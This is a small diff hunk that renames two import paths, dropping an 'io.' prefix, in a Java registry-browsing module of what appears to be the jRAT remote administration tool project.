@@ -2,8 +2,8 @@ package jrat.module.registry;
 
 import com.redpois0n.pathtree.FolderTreeNode;
 import com.redpois0n.pathtree.PathTreeNode;
-import io.jrat.controller.Slave;
-import io.jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.controller.Slave;
+import jrat.controller.packets.incoming.AbstractIncomingPacket;
 import java.io.DataInputStream;
 import javax.swing.ImageIcon;
 import javax.swing.tree.TreePath;
